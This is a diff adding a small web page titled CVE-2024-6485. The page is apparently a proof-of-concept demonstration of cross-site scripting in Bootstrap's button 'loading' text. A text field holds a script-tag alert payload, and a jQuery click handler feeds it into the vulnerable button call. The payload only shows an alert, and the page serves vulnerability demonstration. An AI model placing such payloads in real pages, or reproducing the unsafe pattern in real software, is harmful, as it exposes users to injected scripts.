@@ -1,0 +1,31 @@
+---
+layout: default
+title: CVE-2024-6485
+slug: CVE-2024-6485
+---
+<label for="firstName">Name:</label>
+<input
+  id="firstName"
+  type="text"
+  value="<script>alert('XSS Input Success')</script><span>Loading XSS</span>"
+  style="margin-top: 1rem;"
+/>
+<br />
+<button
+  class="btn btn-primary input-test"
+  data-loading-text="<span>Loading XSS</span>"
+  type="button"
+  style="margin-top: 1rem;"
+>
+  Click Me
+</button>
+<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+<script>
+  $(function () {
+    $('.input-test').click(function () {
+      var inputValue = $('#firstName').val();
+      $(this).data('loadingText', inputValue);
+      $(this).button('loading', inputValue);
+    });
+  });
+</script>
